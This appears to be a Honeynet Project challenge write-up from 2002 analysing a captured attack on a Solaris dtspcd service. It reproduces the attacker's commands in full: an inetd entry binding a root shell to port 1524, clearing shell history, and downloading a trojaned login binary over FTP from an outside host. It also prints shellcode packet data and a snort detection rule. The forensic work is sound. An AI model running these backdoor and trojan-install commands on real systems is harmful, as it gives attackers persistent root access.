@@ -1,0 +1,337 @@
+1.0 -- INTRODUCTION
+
+This report is the analysis done for the Honeynet Project Scan of the Month for 
+April 2002. The object of the report was the analysis of a snort log of traffic 
+captured on January 8th, 2002, during the successful exploitation and backdoor 
+of a Solaris8 Sparc system. The challenge requires that the sessions be 
+analyzed and several questions be answered. I will demontrate my method of 
+analysis first, than give my answers for the challenge questions.
+
+
+
+2.0 -- TOOLS / REFERENCES
+
+The following tools & references were used to perform this analysis.
+
+1. snort 1.8 for unix
+   -> http://www.snort.org 
+
+2. snort rules package 
+   -> http://www.snort.org/dl/signatures/snortrules.tar.gz
+
+3. ethereal for win32
+   -> http://www.ethereal.com 
+
+4. tcpflow
+   -> http://www.circlemud.org/~jelson/software/tcpflow/ 
+
+5. tcpshow 
+   -> http://ftp7.usa.openbsd.org/pub/tools/unix/sysutils/tcpshow/tcpshow.c
+
+6. NOP slide info 
+   -> http://www.geocrawler.com/lists/3/SourceForge/6752/0/7988134/
+
+7. other papers from project.honeynet.org (mostly scan submissions)
+
+
+
+3.0 -- PREPARATION
+
+$ wget -r http://project.honeynet.org/scans/scan20/0108@000-snort.log.tar.gz
+$ md5 0108@000-snort.log.tar.gz
+MD5 (0108@000-snort.log.tar.gz) = 612be364f54ca5fcb47cf70e69419175
+
+MD5 checksum matches. On to the analysis.
+
+
+
+4.0 -- INITIAL ANALYSIS
+
+
+Parse the log using tcpshow. I used the -noHostNames function because the 
+whole domain name may not be shown in the log if the IP is resolved.
+
+$ tcpshow -noHostNames < 0108@000-snort.log > tcp.log
+
+After a bit of reading, we find the entry we're looking for.
+
+---------------------------------------------------------------------------
+Packet 543
+TIME:   09:46:04.378306 (0.084217)
+LINK:   08:00:20:F6:D3:58 -> 00:E0:1E:60:70:40 type=IP
+  IP:   208.61.1.160 -> 172.16.1.102 hlen=20 TOS=00 dgramlen=1500 id=A1AC
+        MF/DF=0/1 frag=0 TTL=48 proto=TCP cksum=241C
+ TCP:   port 3592 -> 6112 seq=4276273429 ack=1600526639
+        hlen=32 (data=1448) UAPRSF=011000 wnd=16060 cksum=E1E9 urg=0
+DATA:   0000000204103e0001  4 ...10...@...@.......@...@...@...@...@.
+        ..@...@...@...@...@...@...@...@...@...@...@...@...@...@...@.
+        ..@...@...@...@...@...@...@...@...@...@...@...@...@...@...@.
+        ..@...@...@...@...@...@...@...@...@...@...@...@...@...@...@.
+        ..@...@...@...@...@...@...@...@...@...@...@...@...@...@...@.
+        ..@...@...@...@...@...@...@...@...@...@...@...@...@...@...@.
+        ..@...@...@...@...@...@...@...@...@...@...@...@...@...@...@.
+        ..@...@...@...@...@...@...@...@...@...@...@...@...@...@...@.
+        ..@...@...@...@...@...@...@...@...@...@...@...@...@...@...@.
+        ..@...@...@...@...@...@...@...@...@...@...@...@...@...@...@.
+        ..@...@...@...@...@...@...@...@...@...@...@...@...@...@...@.
+        ..@...@...@...@...@...@...@...@...@...@...@...@...@...@...@.
+        ..@...@...@...@...@...@...@...@...@...@...@...@...@...@...@.
+        ..@...@...@...@...@...@...@...@...@...@...@...@...@...@...@.
+        ..@...@...@...@...@...@...@...@...@...@...@...@...@...@...@.
+        ..@...@...@...@...@...@...@...@...@...@...@...@...@...@...@.
+        ..@...@...@...@...@...@...@...@...@...@...@...@...@...@...@.
+        ..@...@...@...@...@...@...@...@...@...@...@...@...@...@...@.
+        ..@...@...@...@...@...@...@...@...@...@...@...@...@...@...@.
+        ..@...@...@...@...@...@...@...@...@...@...@...@...@...@...@.
+        ..@...@...@. ¿ÿÿ ¿ÿÿ.ÿÿÿ..à4.#à ¢. .¤. .À* .À* .Ð#ÿàâ#ÿää#ÿè
+        À#ÿì.. ..Ð ./bin/ksh    -c  echo "ingreslock stream tcp nowa
+        it root /bin/sh sh -i">/tmp/x;/usr/sbin/inetd -s /tmp/x;slee
+        p 10;/bin/rm -f /tmp/x AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+        AAAAAAAA
+---------------------------------------------------------------------------
+
+
+Now to isolate the logs related to that host.
+
+$ mkdir attack ; cd attack
+$ tcpflow -r ../0108@000-snort.log 'host 208.61.1.160'
+$ ls -la
+
+drwxr-xr-x  2 adam  users   512 Apr 14 22:12 .
+drwxr-xr-x  5 adam  users   512 Apr 14 22:12 ..
+-rw-r--r--  1 adam  users   449 Apr 14 22:12 172.016.001.102.01524-208.061.001.160.03596
+-rw-r--r--  1 adam  users    67 Apr 14 22:12 172.016.001.102.06112-208.061.001.160.03590
+-rw-r--r--  1 adam  users    53 Apr 14 22:12 208.061.001.160.03590-172.016.001.102.06112
+-rw-r--r--  1 adam  users  4178 Apr 14 22:12 208.061.001.160.03592-172.016.001.102.06112
+-rw-r--r--  1 adam  users  4178 Apr 14 22:12 208.061.001.160.03593-172.016.001.102.06112
+-rw-r--r--  1 adam  users  4178 Apr 14 22:12 208.061.001.160.03594-172.016.001.102.06112
+-rw-r--r--  1 adam  users  4178 Apr 14 22:12 208.061.001.160.03595-172.016.001.102.06112
+-rw-r--r--  1 adam  users   370 Apr 14 22:12 208.061.001.160.03596-172.016.001.102.01524
+
+
+Now run the logfile through snort for each destination port for more info. 
+
+$ snort -dv -r ../0108@000-snort.log -l . port 6112 > snort-dump
+$ snort -dv -r ../0108@000-snort.log -l . port 1524 > snort-dump2
+
+
+
+5.0 -- INTRUSION ANALYSIS
+
+
+5.1a -- SCAN
+================================================================================
+01/08 09:45:53  - first contact
+================================================================================
+
+We see the initial connection to the dtspcd daemon, probably just the hacker 
+manually checking to see if the port is open.
+
+--------------------------------------------------------------------------------
+session-reference: attack/208.061.001.160.03590-172.016.001.102.06112
+--------------------------------------------------------------------------------
+
+
+5.1b -- EXPLOIT
+================================================================================
+01/08 09:46:04  - the intrusion.
+================================================================================
+
+Here the hacker attempts to exploit the dtspcd daemon, which happens 4 times.
+
+--------------------------------------------------------------------------------
+session-reference: attack/208.061.001.160.03592-172.016.001.102.06112
+	           attack/208.061.001.160.03593-172.016.001.102.06112
+	           attack/208.061.001.160.03594-172.016.001.102.06112
+	           attack/208.061.001.160.03595-172.016.001.102.06112
+--------------------------------------------------------------------------------
+
+
+5.1c -- BACKDOOR INSTALLATION
+================================================================================
+01/08 09:46:04  - backdoor installed  
+================================================================================
+
+The following commands are run automatically by the exploit: 
+
+/bin/ksh -c echo "ingreslock  stream  tcp  nowait root /bin/sh  sh -i" > /tmp/x;
+/usr/sbin/inetd -s /tmp/x;
+sleep 10;
+/bin/rm -f /tmp/x;
+
+--------------------------------------------------------------------------------
+session-reference: attack/208.061.001.160.03595-172.016.001.102.06112
+--------------------------------------------------------------------------------
+
+
+5.1d --- THE HACK
+================================================================================
+01/08 09:47:38  - trojaned 'login' binary installed.
+================================================================================
+
+
+[ note: the following commands appear to be automated ]
+
+uname -a;ls -l /core var/dt/tmp/DTSPCD.log;
+PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/ccs/bin:/usr/gnu/bin;
+export PATH;
+echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'`
+
+# SunOS buzzy 5.8 Generic_108528-03 sun4u sparc SUNW,Ultra-5_10
+/core: No such file or directory
+/var/dt/tmp/DTSPCD.log: No such file or directory
+BD PID(s): 3476
+
+
+[ note: these commands appear to be manually inputted ]
+
+# w
+  8:47am  up 11:24,  0 users,  load average: 0.12, 0.04, 0.02
+User     tty           login@  idle   JCPU   PCPU  what
+# unset HISTFILE
+# cd /tmp
+mkdir /usr/lib
+# mkdir: Failed to make directory "/usr/lib"; File exists
+# mv /bin/login /usr/lib/libfl.k
+# ftp 64.224.118.115
+ftp
+ftp: ioctl(TIOCGETP): Invalid argument
+Password:a@
+cd pub
+binary
+get sun1
+bye
+Name (64.224.118.115:root): # 
+# ls
+ps_data
+sun1
+# chmod 555 sun1
+# mv sun1 /bin/login
+# 
+
+--------------------------------------------------------------------------------
+session-reference: attack/172.016.001.102.01524-208.061.001.160.03596
+		   attack/208.061.001.160.03596-172.016.001.102.01524
+--------------------------------------------------------------------------------
+
+
+5.1e -- EXPLOIT COMPLETION
+================================================================================
+attack duration: 09:45:53 - 09:48:41 ref: attack/snort-dump & attack/snort-dump2
+================================================================================
+
+
+
+6.0 -- FURTHER INVESIGATION
+================================================================================
+capturing and analysing 'sun1'
+================================================================================
+We saw earlier that the hacker downloaded a binary from an ftp called 'sun1'. 
+For this part, I decided to go the easy route and use a windows machine running 
+Ethereal. I simply loaded the snort log, found the initial ftp-data packet, and 
+used the "follow tcp stream" function. 
+
+I then transferred the file to a unix machine, and did the following:
+
+$ strings sun1 >> strings-dump
+$ more strings-dump
+" H@
+$#<@
+/ @@
+# @@
+DISPLAY
+/usr/lib/libfl.k
+pirc
+/bin/sh
+...
+
+From this, I assume that the 'sun1' binary simply acts as a wrapper for the old 
+login binary, which was backed up under /usr/lib/libfl.k [ see section 5.1d ]. 
+If the user login 'pirc' is used, the hacker is instantly given a shell, 
+otherwise, the user input is passed to the original login binary.
+
+
+
+7.0 -- QUESTIONS
+
+1. What is a NOP slide, and how is this one different from the NOP slide in the 
+   rpc.statd exploit in Scan10? 
+
+   The NOP allows an attacker to fill an address space with a large number of 
+   NOPs followed by his or her code of choice.  This allows "sledding" or 
+   "sliding" into the attackers shellcode. This NOP slide is different in that 
+   it uses this repeating pattern: "801c 4011" instead of "9090 9090". I'm 
+   assuming this is simply due to the platform differences, one being a sparc 
+   solaris machine, the other being an x86 redhat machine.
+
+
+2. The attack was on 08 Jan, 2002. Would Snort have generated an alert then for 
+   the attack? 
+
+   Yes, snort would have detected the sparc shellcode that was used in the 
+   exploit with the following rule:
+
+   alert ip $EXTERNAL_NET any -> $HOME_NET any (msg:"SHELLCODE sparc NOOP"; 
+   content:"|801c 4011 801c 4011 801c 4011 801c 4011|"; reference:arachnids,353; 
+   classtype: shellcode-detect; sid:645; rev:2;)
+
+   This rule was taken from shellcode.rules included the snort rules package, 
+   which I had an older copy of in use on a system of mine. The header shows 
+   that it was last changed on  December 28th, 2001. This file has since been
+   updated in the newest ruleset.
+
+   # $Id: shellcode.rules,v 1.10 2001/12/28 21:59:34 cazz Exp $   
+
+
+3. In the exploit code, the command "/bin/sh sh -i" is given, what is its 
+   purpose, and why is 'sh' shown twice? 
+
+   The command 'sh -i' puts sh into interactive mode. The reason 'sh' is 
+   listed twice is because it was being used as an entry in inetd.conf, which 
+   requires the server program, than the server program arguements.
+
+
+4. The attacker executed a variety of commands on the hacked Solaris box. 
+   Which commands were automated by the exploit, which commands were manual by 
+   the attacker himself? 
+
+   Refer to sections 5.1c and 5.1d.
+
+
+5. What is sun1, and how does it work? 
+
+   sun1 is a trojaned sparc binary of 'login', which will allow the hacker to 
+   obtain root access later on.  Please refer to section 6.0.
+
+
+6. What did you learn from this exercise? 
+
+   I learned the usage of tcpflow and tcpshow, as well as better analysis 
+   techniques in general.
+
+
+7. How long did this challenge take you? 
+ 
+   About 4.5 hours. 2 hours for my actual analysis, and 2.5 hours for the write 
+   up.
+
+
+
+8.0 -- BONUS QUESTION
+
+One of the commands executed during the attack is 
+echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'` 
+
+What is the purpose of this command and what does 'BD' stand for? 
+
+This simply locates the PID of the copy of inetd that was executed by the 
+exploit. BD in this case, stands for 'backdoor', because the inetd was 
+configured to run a shell on port 1524.
+
+
+
+9.0 -- CONTACT DETAILS
+
+This analysis was done by Adam Gilbert. E-mail: adam@dispair.dyndns.org.
+
+
